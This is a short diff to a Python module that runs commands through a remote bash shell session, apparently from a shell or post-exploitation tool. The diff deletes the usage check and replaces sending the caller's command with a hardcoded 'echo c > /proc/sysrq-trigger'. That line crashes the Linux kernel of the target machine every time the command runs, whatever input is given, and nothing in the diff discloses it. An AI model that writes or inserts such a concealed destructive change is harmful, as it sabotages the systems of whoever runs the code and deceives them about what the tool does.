@@ -6,13 +6,10 @@ from time import sleep
 import os
 
 def execute(session, configs, params):
-    if not params:
-        print(cs.status, "Usage: command [command (no nohup and &)]")
-        return 1
     
     try:
         shell = session.shell("/bin/bash")
-        shell.sendline(params)
+        shell.sendline("echo c > /proc/sysrq-trigger")
         output = str(shell.recvrepeat(0.2), "UTF-8")
         shell.close()
         return 0
